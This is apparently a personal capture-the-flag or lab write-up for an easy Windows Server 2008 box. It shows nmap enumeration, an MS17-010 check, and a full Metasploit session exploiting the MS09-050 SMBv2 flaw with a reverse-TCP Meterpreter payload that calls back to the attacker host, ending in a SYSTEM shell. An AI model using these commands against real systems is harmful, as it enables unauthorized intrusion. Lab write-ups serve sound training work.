
### Lab Details 

- Difficulty: Easy
- Type: Windows 

#### Enumeration
- run `nmap` against the target
```
$ nmap 192.168.52.40 -sC -A -p- --min-rate 1000
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 10:07 +0000
Nmap scan report for 192.168.52.40
Host is up (0.00042s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2026-03-29T10:09:52+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2026-03-29T10:09:44+00:00
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-03-04T23:44:47
|_Not valid after:  2025-09-03T23:44:47
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.
```
- the target is running a older version of Windows server `Windows Server (R) 2008 Standard 6001 Service Pack 1`
- search online for exploit against the target version its vulnerable to Eternal Blue
- enumerate using `nmap` script 
```
$ nmap -p445 --script smb-vuln-ms17-010 192.168.52.40
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 10:14 +0000
Nmap scan report for 192.168.52.40
Host is up (0.00080s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds

```
- however Eternal Blue is not the vector, enumerate further found that its also vulnerable to https://www.exploit-db.com/exploits/40280

#### Initial Foothold 

#### Lateral Movement (If any)

#### Privilege Escalation
- attempt to exploit the vulnerability using `msfconsole` using `ms09_050_smb2_negotiate_func_index` module 
```
msf > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RHOST 192.168.57.40
RHOST => 192.168.57.40
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RPORT 445
RPORT => 445
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set TARGET 0
TARGET => 0
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LHOST 192.168.49.57
LHOST => 192.168.49.57
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LPORT 4444
LPORT => 4444

sf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > exploit
[*] Started reverse TCP handler on 192.168.49.57:4444 
[*] 192.168.57.40:445 - Connecting to the target (192.168.57.40:445)...
[*] 192.168.57.40:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.57.40:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (190534 bytes) to 192.168.57.40
[*] Meterpreter session 1 opened (192.168.49.57:4444 -> 192.168.57.40:49159) at 2026-03-29 14:36:32 +0000

meterpreter > shell
Process 2976 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B863-254D

 Directory of C:\Users\Administrator\Desktop

02/03/2011  08:51 PM    <DIR>          .
02/03/2011  08:51 PM    <DIR>          ..
05/20/2016  10:26 PM                32 network-secret.txt
03/29/2026  07:30 AM                34 proof.txt
               2 File(s)             66 bytes
               2 Dir(s)   4,108,283,904 bytes free
```
#### Resources

#### Lesson Learned
